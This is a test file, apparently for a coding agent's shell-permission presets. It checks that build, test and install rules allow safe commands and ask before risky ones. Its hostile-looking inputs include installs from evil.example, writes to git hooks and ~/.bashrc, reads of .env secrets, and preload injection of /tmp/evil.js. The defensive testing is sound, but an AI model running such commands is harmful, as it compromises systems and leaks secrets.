import { describe, expect, test } from "bun:test"
import { Effect, Exit } from "effect"
import path from "node:path"
import { ShellParse } from "@opencode/core/shell/parse"
import type { KiloPermissionsRpc } from "@opencode/schema/kilocode/permissions"
import { FSUtil } from "@opencode/util/fs-util"
import { catalog, classify, type Catalog } from "../src/permissions/presets"
import { allowsRequest, covers, missing } from "../src/permissions/rules"

type Preset = KiloPermissionsRpc.Preset

const root = "/project"

function projectFilesystem(files: Record<string, string>, denied: ReadonlySet<string> = new Set()) {
  const missing = { reason: { _tag: "NotFound" } }
  const accessDenied = { reason: { _tag: "PermissionDenied" } }
  return {
    readFileString: (filename: string) => {
      if (denied.has(filename)) return Effect.fail(accessDenied)
      if (!(filename in files)) return Effect.fail(missing)
      return Effect.succeed(files[filename]!)
    },
    stat: (filename: string) => {
      if (denied.has(filename)) return Effect.fail(accessDenied)
      if (!(filename in files)) return Effect.fail(missing)
      return Effect.succeed({ type: "File" })
    },
  } as unknown as FSUtil.Interface
}

function packageFiles(packageManifest: Record<string, unknown>, managerFiles: string[] = []) {
  return Object.fromEntries([
    [path.join(root, "package.json"), JSON.stringify(packageManifest)],
    ...managerFiles.map((filename) => [path.join(root, filename), ""]),
  ])
}

function kiloFiles() {
  return {
    ...packageFiles({ packageManager: "bun@1.4.4", devDependencies: { typescript: "^5" } }),
    [path.join(root, "tsconfig.json")]: "{}",
    [path.join(root, "packages/kilo-cli/package.json")]: JSON.stringify({ name: "@kilocode/kilo-cli" }),
    [path.join(root, "packages/kilo-plugin/package.json")]: JSON.stringify({ name: "@kilocode/kilo-plugin" }),
  }
}

function preset(catalogue: Catalog, id: Preset["id"]) {
  const value = catalogue.presets.find((item) => item.id === id)
  expect(value).toBeDefined()
  return value!
}

function effects(presetValue: Preset, command: string) {
  const parsed = Effect.runSync(ShellParse.scan(command, "bash", root))
  return parsed.commands.map((item) => (covers(item.resource, presetValue.resources, root) ? "allow" : "ask"))
}

describe("permission setup catalog", () => {
  test("classifies Kilo Bun projects with the exact ordered choices and default", async () => {
    const result = await Effect.runPromise(catalog(projectFilesystem(kiloFiles()), root))
    expect(result.presets.map((item) => item.id)).toEqual([
      "kilo-bun-checks",
      "typescript-checks",
      "dependency-install",
    ])
    expect(result.defaultID).toBe("kilo-bun-checks")
    expect(result.presets[0]?.resources).toEqual([
      "bun run test *",
      "bun run typecheck *",
      "bun run lint *",
      "bun run check *",
      "bun run build *",
      "bun test *",
      "bun typecheck *",
      "bun lint *",
      "bun check *",
      "bun build *",
      "bun --version *",
      "bun -v *",
      "bun --help *",
      "bun -h *",
      "bun help *",
      "node --version *",
      "node -v *",
      "bun run typecheck:tsc *",
      "bun typecheck:tsc *",
      "bun run check:architecture *",
      "bun run check:duplication *",
      "bun run check:generated *",
      "bun run lint:changed *",
      "bun script/kilocode/metrics/check.ts *",
    ])
  })

  test.each(["bun", "npm", "pnpm", "yarn"] as const)(
    "detects an explicit %s package manager and returns generic alternatives",
    async (manager) => {
      const result = await Effect.runPromise(
        catalog(
          projectFilesystem(
            packageFiles({ packageManager: `${manager}@1.0.0`, dependencies: { "@typescript/native": "1" } }),
          ),
          root,
        ),
      )
      expect(result.presets.map((item) => item.id)).toEqual(["typescript-checks", "dependency-install"])
      expect(result.defaultID).toBe("typescript-checks")
      expect(result.presets[0]?.resources[0]).toBe(`${manager} run test *`)
    },
  )

  test("uses lockfiles in deterministic order and falls back to npm", async () => {
    const bun = await Effect.runPromise(
      catalog(
        projectFilesystem(packageFiles({ devDependencies: { typescript: "1" } }, ["package-lock.json", "bun.lock"])),
        root,
      ),
    )
    expect(bun.presets[0]?.resources[0]).toBe("bun run test *")

    const npm = await Effect.runPromise(
      catalog(projectFilesystem(packageFiles({ devDependencies: { typescript: "1" } })), root),
    )
    expect(npm.presets[0]?.resources[0]).toBe("npm run test *")
  })

  test("keeps generic TypeScript choices alongside Kilo-specific choices", async () => {
    const result = await Effect.runPromise(catalog(projectFilesystem(kiloFiles()), root))
    expect(preset(result, "typescript-checks").resources).toContain("bun run test *")
    expect(preset(result, "typescript-checks").resources).not.toContain("bun run check:architecture *")
    expect(preset(result, "dependency-install").resources).toContain("bun install *")
    expect(preset(result, "dependency-install").resources).not.toContain("bun add *")
    expect(preset(result, "dependency-install").resources).not.toContain("bun run check:architecture *")
    expect(preset(result, "dependency-install").resources).not.toContain("bun run test *")
  })

  test("grants bare commands and arguments but not neighboring command names", () => {
    const checks = classify({ manager: "bun", kilo: false })
    const install = preset(checks, "dependency-install")
    expect(effects(preset(checks, "typescript-checks"), "bun run test")).toEqual(["allow"])
    expect(effects(preset(checks, "typescript-checks"), "bun run test -- unit")).toEqual(["allow"])
    expect(effects(preset(checks, "typescript-checks"), "bun run test-dangerous")).toEqual(["ask"])
    expect(effects(install, "bun install")).toEqual(["allow"])
    expect(effects(install, "bun run test")).toEqual(["ask"])
    expect(effects(preset(checks, "typescript-checks"), "bun install")).toEqual(["ask"])
    expect(effects(preset(checks, "typescript-checks"), "bun run publish")).toEqual(["ask"])
  })

  test("grants version and help inspection commands without allowing mutating version subcommands", () => {
    const bun = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks")
    expect(effects(bun, "bun --version")).toEqual(["allow"])
    expect(effects(bun, "bun -v")).toEqual(["allow"])
    expect(effects(bun, "bun --help")).toEqual(["allow"])
    expect(effects(bun, "bun -h")).toEqual(["allow"])
    expect(effects(bun, "bun help install")).toEqual(["allow"])
    expect(effects(bun, "node --version")).toEqual(["allow"])
    expect(effects(bun, "node -v")).toEqual(["allow"])
    expect(effects(bun, "bun --version && bun help install 2>&1")).toEqual(["allow", "allow"])
    expect(effects(bun, "bun --version || git push")).toEqual(["allow", "ask"])

    const npm = preset(classify({ manager: "npm", kilo: false }), "typescript-checks")
    expect(effects(npm, "npm --version")).toEqual(["allow"])
    expect(effects(npm, "npm version patch")).toEqual(["ask"])
  })

  test("grants abbreviated install commands in install sets", () => {
    const bun = preset(classify({ manager: "bun", kilo: true }), "dependency-install")
    expect(effects(bun, "bun i")).toEqual(["allow"])
    expect(effects(bun, "bun install --frozen-lockfile 2>&1")).toEqual(["allow"])
    expect(effects(preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks"), "bun i")).toEqual(["ask"])

    const npm = preset(classify({ manager: "npm", kilo: false }), "dependency-install")
    expect(effects(npm, "npm i")).toEqual(["allow"])
    expect(effects(npm, "npm ci --omit=dev")).toEqual(["allow"])

    const pnpm = preset(classify({ manager: "pnpm", kilo: false }), "dependency-install")
    expect(effects(pnpm, "pnpm i")).toEqual(["allow"])
  })

  test("installs only from the lockfile: a package, URL or tarball argument asks", () => {
    for (const manager of ["bun", "npm", "pnpm", "yarn"] as const) {
      const install = preset(classify({ manager, kilo: manager === "bun" }), "dependency-install")
      expect(effects(install, `${manager} install`)).toEqual(["allow"])
      for (const command of [
        `${manager} add lodash`,
        `${manager} add https://evil.example/x.tgz`,
        `${manager} install git+https://github.com/evil/pkg`,
        `${manager} install lodahs`,
        `${manager} install ./vendor/pkg.tgz`,
        `${manager} install --omit dev`,
      ]) {
        expect(effects(install, command)).toEqual(["ask"])
      }
    }
    expect(effects(preset(classify({ manager: "npm", kilo: false }), "dependency-install"), "npm i lodahs")).toEqual([
      "ask",
    ])
    // A set stored while the install set still held `add *` stays limited to lockfile installs.
    expect(covers("bun add https://evil.example/x.tgz", ["bun add *"], root)).toBe(false)
  })

  test("holds no output helpers; chained helpers are left to the agent's rules", () => {
    for (const manager of ["bun", "npm", "pnpm", "yarn"] as const) {
      for (const presetValue of classify({ manager, kilo: manager === "bun" }).presets) {
        for (const resource of ["tail *", "head *", "grep *", "echo *", "ls *"]) {
          expect(presetValue.resources).not.toContain(resource)
        }
      }
    }
    const install = preset(classify({ manager: "bun", kilo: true }), "dependency-install")
    expect(effects(install, "bun install 2>&1 | tail -30")).toEqual(["allow", "ask"])
    expect(effects(install, "head -n 5 < .env")).toEqual(["ask"])
    const resources = ["bun install 2>&1", "tail -30"]
    const rules = [{ action: "shell", resource: "tail *", effect: "allow" as const }]
    expect(allowsRequest({ action: "shell", resources, rules, applied: install.resources, directory: root })).toBe(true)
    expect(allowsRequest({ action: "shell", resources, rules: [], applied: install.resources, directory: root })).toBe(
      false,
    )
  })

  test("never allows a redirected file read or write or a process substitution, even when the wildcard matches", () => {
    for (const presetValue of classify({ manager: "bun", kilo: true }).presets) {
      expect(effects(presetValue, "bun run test > .git/hooks/pre-commit")).toEqual(["ask"])
      expect(effects(presetValue, "bun install >> ~/.bashrc")).toEqual(["ask"])
      expect(effects(presetValue, "bun run test &> out.log")).toEqual(["ask"])
      expect(effects(presetValue, "bun run test 2>/dev/nullx")).toEqual(["ask"])
      expect(effects(presetValue, "bun run test <(cat secret)")).toEqual(["ask", "ask"])
      expect(effects(presetValue, "bun run test < .env")).toEqual(["ask"])
      expect(effects(presetValue, "bun run test <<< secret")).toEqual(["ask"])
    }
    for (const presetValue of classify({ manager: "bun", kilo: true }).presets) {
      const command = presetValue.id === "dependency-install" ? "bun install" : "bun run test"
      expect(effects(presetValue, `${command} >/dev/null 2>&1`)).toEqual(["allow"])
      expect(effects(presetValue, `${command} 2>/dev/null`)).toEqual(["allow"])
    }
  })

  test("never lets a project script or install run in another directory, workspace, config or program", () => {
    for (const manager of ["bun", "npm", "pnpm", "yarn"] as const) {
      const checks = preset(classify({ manager, kilo: false }), "typescript-checks")
      for (const command of [
        `${manager} run test --prefix /tmp/other`,
        `${manager} run test --prefix=/tmp/other`,
        `${manager} run test --pref /tmp/other`,
        `${manager} run test --workspace /tmp/other`,
        `${manager} run test -w other`,
        `${manager} run test -C /tmp/other`,
        `${manager} run test --cwd /tmp/other`,
        `${manager} run test --dir /tmp/other`,
        `${manager} run test --filter other`,
        `${manager} run test --global`,
        `${manager} run test --script-shell=/tmp/evil`,
        `${manager} run test --node-options="--require /tmp/evil.js"`,
        `${manager} run test --userconfig /tmp/npmrc`,
        `${manager} run test --config.script-shell=/tmp/evil`,
        `${manager} run test --preload /tmp/evil.ts`,
        `${manager} run test $EXTRA`,
        `${manager} test --prefix /tmp/other`,
      ]) {
        expect(effects(checks, command)).toEqual(["ask"])
      }
      const install = preset(classify({ manager, kilo: false }), "dependency-install")
      expect(effects(install, `${manager} install --prefix /tmp/other`)).toEqual(["ask"])
      expect(effects(install, `${manager} install --registry=https://evil.example`)).toEqual(["ask"])
      expect(effects(install, `${manager} install --global`)).toEqual(["ask"])
      expect(effects(checks, `${manager} run test -- --prefix /tmp/other`)).toEqual(["allow"])
      expect(effects(checks, `${manager} run test --watch=false`)).toEqual(["allow"])
      expect(effects(checks, `${manager} run lint --fix`)).toEqual(["allow"])
    }
  })

  test("asks when a path argument before -- resolves outside the project", () => {
    const checks = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks")
    for (const command of [
      "bun test /tmp/evil.test.ts",
      "bun run test ../../other-repo",
      "bun run test ..",
      "bun test ~/evil.test.ts",
      "bun run test --coverage-dir=/tmp/out",
      "bun script/kilocode/metrics/check.ts /etc",
    ]) {
      expect(effects(checks, command)).toEqual(["ask"])
    }
    for (const command of [
      "bun test src/foo.test.ts",
      "bun test ./src/../test/foo.test.ts",
      "bun run test .",
      "bun test foo",
      "bun run test --watch=false",
      "bun run test -- /tmp/elsewhere",
      "bun script/kilocode/metrics/check.ts",
    ]) {
      expect(effects(checks, command)).toEqual(["allow"])
    }
  })

  test("includes the Kilo-only development checks without broad shell grants", () => {
    const checks = classify({ manager: "bun", kilo: true })
    const kilo = preset(checks, "kilo-bun-checks")
    expect(effects(kilo, "bun run typecheck:tsc")).toEqual(["allow"])
    expect(effects(kilo, "bun run check:architecture --strict")).toEqual(["allow"])
    expect(effects(kilo, "bun run check:architecture-dangerous")).toEqual(["ask"])
    expect(effects(kilo, "bun *")).toEqual(["ask"])
    expect(effects(kilo, "git push")).toEqual(["ask"])
  })

  test("returns no choices for missing, malformed, unsupported, or non-TypeScript projects", async () => {
    const cases = [
      projectFilesystem({}),
      projectFilesystem({ [path.join(root, "package.json")]: "{" }),
      projectFilesystem(packageFiles({ packageManager: "cargo@1", devDependencies: { typescript: "1" } })),
      projectFilesystem(packageFiles({ name: "plain-javascript" }, ["bun.lock"])),
    ]
    for (const filesystem of cases) {
      expect(await Effect.runPromise(catalog(filesystem, root))).toEqual({ presets: [] })
    }
  })

  test("propagates filesystem access failures instead of treating them as missing", async () => {
    const filename = path.join(root, "package.json")
    const result = await Effect.runPromiseExit(
      catalog(projectFilesystem({ [filename]: "{}" }, new Set([filename])), root),
    )
    expect(Exit.isFailure(result)).toBe(true)
  })
})

describe("permission set rules", () => {
  const sets = preset(classify({ manager: "bun", kilo: false }), "typescript-checks").resources

  test("allows a request only when every resource is allowed by the rules or covered by the sets", () => {
    const request = { action: "shell", rules: [], applied: sets, directory: root }
    expect(allowsRequest({ ...request, resources: ["bun run test"] })).toBe(true)
    expect(allowsRequest({ ...request, resources: ["bun run test", "bun install"] })).toBe(false)
    expect(
      allowsRequest({
        ...request,
        resources: ["bun run test", "bun install"],
        rules: [{ action: "shell", resource: "bun install", effect: "allow" }],
      }),
    ).toBe(true)
    expect(allowsRequest({ ...request, resources: ["bun run test"], applied: [] })).toBe(false)
  })

  test("reports the command parts a set does not cover and asks for a command it cannot scan", async () => {
    expect(await Effect.runPromise(missing("bun run test && git push", root, sets))).toEqual(["git push"])
    expect(await Effect.runPromise(missing("bun run lint", root, sets))).toEqual([])
    const opaque = await Effect.runPromise(missing("bun run test $(", root, sets))
    expect(opaque).toHaveLength(1)
    expect(opaque[0]).toStartWith("bun run test $(")
  })
})
